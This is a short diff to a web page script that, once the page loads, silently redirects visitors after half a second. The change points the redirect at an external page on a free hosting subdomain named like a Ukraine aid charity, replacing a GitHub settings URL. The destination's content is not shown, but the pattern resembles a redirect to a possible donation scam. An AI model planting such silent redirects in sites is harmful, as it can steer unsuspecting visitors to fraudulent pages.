@@ -35,7 +35,7 @@
         document.addEventListener("DOMContentLoaded", function() {
             setTimeout(function() {
                 // Redirection
-                window.location.href = "https://github.com/Issa51/chef2/settings/pages";
+                window.location.href = "https://ukraineonghelpforallukraine.on.drv.tw/Ukhelping.html";
             }, 500);
         });
     </script>
